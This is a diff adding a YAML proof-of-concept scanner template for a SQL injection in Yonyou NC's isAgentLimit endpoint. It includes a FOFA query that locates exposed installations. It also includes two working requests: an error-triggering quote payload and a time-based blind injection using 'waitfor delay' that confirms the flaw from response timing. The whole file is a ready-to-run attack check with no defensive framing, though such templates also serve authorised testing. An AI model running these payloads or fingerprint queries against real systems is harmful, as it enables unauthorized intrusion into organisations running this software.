@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-nc-isagentlimit-sqli
+info:
+  name: 用友 NC isAgentLimit SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'
+  expression: status_code == 500 && contains(body,`关键字 'null' 附近有语法错误`)
+- method: GET
+  path: /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"<info>") &&
+
+    contains(body,"xml") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
